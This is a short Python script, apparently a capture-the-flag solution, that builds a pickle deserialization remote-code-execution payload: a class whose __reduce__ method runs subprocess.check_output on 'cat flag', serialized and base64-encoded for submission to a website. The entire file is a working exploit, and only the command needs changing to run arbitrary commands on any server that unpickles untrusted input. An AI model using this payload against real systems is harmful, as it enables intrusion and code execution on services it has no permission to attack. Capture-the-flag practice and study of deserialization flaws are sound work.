import pickle
import base64
import subprocess

# Pickle RCE exploit modified from https://davidhamann.de/2020/04/05/exploiting-python-pickle/
class RCE:
    def __reduce__(self):
        cmd = ("cat", "flag") # order needed to be treated as a literal command
        return subprocess.check_output, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
  # converts payload to base64 for entry into site
